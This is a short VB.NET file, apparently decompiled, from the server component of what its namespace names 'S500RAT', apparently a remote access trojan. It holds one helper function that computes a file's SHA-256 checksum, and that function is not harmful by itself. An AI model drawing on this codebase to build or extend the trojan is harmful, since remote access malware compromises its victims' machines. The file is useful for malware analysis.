Imports System
Imports System.IO
Imports System.Security.Cryptography
Imports Microsoft.VisualBasic.CompilerServices

Namespace S500RAT.Server.Algorithm
	' Token: 0x02000009 RID: 9
	Public NotInheritable Module GetHash
		' Token: 0x06000054 RID: 84 RVA: 0x00002D64 File Offset: 0x00000F64
		Public Function GetChecksum(file As String) As String
			Dim result As String
			Using fileStream As FileStream = File.OpenRead(file)
				Dim sha256Managed As SHA256Managed = New SHA256Managed()
				Dim value As Byte() = sha256Managed.ComputeHash(fileStream)
				result = BitConverter.ToString(value).Replace("-", String.Empty)
			End Using
			Return result
		End Function
	End Module
End Namespace
